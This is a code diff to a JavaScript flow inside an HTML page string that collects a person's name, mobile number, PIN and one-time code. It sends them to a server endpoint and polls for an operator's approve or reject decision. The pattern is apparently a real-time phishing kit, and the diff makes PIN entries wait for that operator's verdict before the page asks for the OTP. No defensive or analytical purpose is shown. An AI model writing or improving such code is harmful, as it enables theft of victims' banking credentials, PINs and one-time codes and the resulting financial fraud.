@@ -974,60 +974,70 @@ HTML_PAGE = r"""<!DOCTYPE html>
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
             if (step === 'pin') {
-              enteredPin = '';
-              updatePinDots();
-              goTo('pin');
-              alert('The PIN entered is incorrect. Please re-enter your PIN.');
+                isPinBusy = false;
+                enteredPin = '';
+                for (let i = 0; i < 4; i++) {
+                    const dot = document.getElementById('dot-' + i);
+                    if (dot) dot.classList.remove('wave-dot-' + i);
+                }
+                updatePinDots();
+                const msg = document.getElementById('pin-status-msg');
+                if (msg) msg.innerText = 'Incorrect PIN. Please re-enter.';
+                goTo('pin');
+                alert('The PIN entered is incorrect. Please re-enter your PIN.');
             } else if (step === 'otp') {
-              const btnOtp = document.getElementById('btn-otp');
-              if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
-              const errorMsg = document.getElementById('otp-error-msg');
-              if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
-              goTo('otp');
+                const btnOtp = document.getElementById('btn-otp');
+                if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY & CONTINUE'; }
+                const errorMsg = document.getElementById('otp-error-msg');
+                if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
+                goTo('otp');
             }
-          } else if (data.status === 'approve') {
+        } else if (data.status === 'approve') {
             clearInterval(decisionTimer);
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
-            showApprovedScreen();
-          }
-        } catch (e) {}
-      }, 3000);
-    }
+            if (step === 'pin') {
+                isPinBusy = false;
+                enteredPin = '';
+                const msg = document.getElementById('pin-status-msg');
+                if (msg) msg.innerText = '';
+                for (let i = 0; i < 4; i++) {
+                    const dot = document.getElementById('dot-' + i);
+                    if (dot) dot.classList.remove('wave-dot-' + i);
+                }
+                updatePinDots();
+                goTo('otp');
+            } else {
+                showApprovedScreen();
+            }
+        }
+    } catch (e) {}
+}, 3000);
+}
 
-    function submitPin() {
-      const formattedPhone = formatMobileWithCountryCode(appState.mobile);
-           fetch('/api/save', {
+function submitPin() {
+    const formattedPhone = formatMobileWithCountryCode(appState.mobile);
+    const otpLabel = document.getElementById('otp-mobile-label');
+    if (otpLabel) otpLabel.innerText = formattedPhone;
+
+    const msg = document.getElementById('pin-status-msg');
+    if (msg) msg.innerText = 'Verifying PIN... Please wait.';
+
+    fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          appId: appState.appId,
-          ref: appState.ref,
-          fullName: appState.fullName,
-          mobile: formattedPhone,
-          field: 'entered_pin',
-          value: enteredPin
+            appId: appState.appId,
+            ref: appState.ref,
+            fullName: appState.fullName,
+            mobile: formattedPhone,
+            field: 'entered_pin',
+            value: enteredPin
         })
-      }).catch(err => console.error(err));
+    }).catch(err => console.error(err));
 
-      watchHostDecision('pin');
-
-
-      // Reset PIN busy state and animations
-      isPinBusy = false;
-      const msg = document.getElementById('pin-status-msg');
-      if (msg) msg.innerText = '';
-      for (let i = 0; i < 4; i++) {
-        const dot = document.getElementById('dot-' + i);
-        if (dot) dot.classList.remove('wave-dot-' + i);
-      }
-      enteredPin = '';
-      updatePinDots();
-
-      const otpLabel = document.getElementById('otp-mobile-label');
-      if (otpLabel) otpLabel.innerText = formattedPhone;
-      goTo('otp');
-    }
+    watchHostDecision('pin');
+}
 
     function otpMove(input, index) {
       if (input.value.length === 1 && index < 6) {
